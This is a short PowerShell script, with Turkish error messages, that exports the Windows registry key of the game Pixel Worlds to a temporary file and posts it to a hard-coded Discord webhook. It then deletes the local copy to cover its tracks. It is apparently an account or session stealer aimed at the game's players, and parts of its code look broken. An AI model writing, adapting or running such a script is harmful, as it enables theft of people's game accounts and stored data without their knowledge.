$REG_KEY = "HKCU\Software\Social First\Pixel Worlds"
$WEBHOOK_URL = "https://discord.com/api/webhooks/1558104979179573438/HfzCsdWuewWgBmxWnXhvYBIp__d_8RqTBaF5ORvmmUwZus0aClK_LFJqMFidCAnksJjo"

$TS = $env:COMPUTERNAME
$OUT = Join-Path -Path $env:TEMP -ChildPath ("PixelWorlds-{0}.reg" -f $TS)

try {
    Export-RegKey -Key $REG_KEY -Path $OUT
} catch {
    Write-Error "REG KEY EXPORT HATASI"
    exit 20
}

try {
    $data = @{
        content = "Pixel Worlds registry export ($TS)"
        file1   = New-Object System.IO.FileInfo -ArgumentList ($OUT)
    } | ConvertTo-Json

    Invoke-WebRequest -Uri $WEBHOOK_URL -Method Post -Body $data -ContentType "multipart/form-data" -File $OUT -UseBasicParsing
} catch {
    Write-Error "WEBHOOK HATASI"
    Remove-Item -Path $OUT -Force
    exit 20
}

Remove-Item -Path $OUT -Force
exit 0
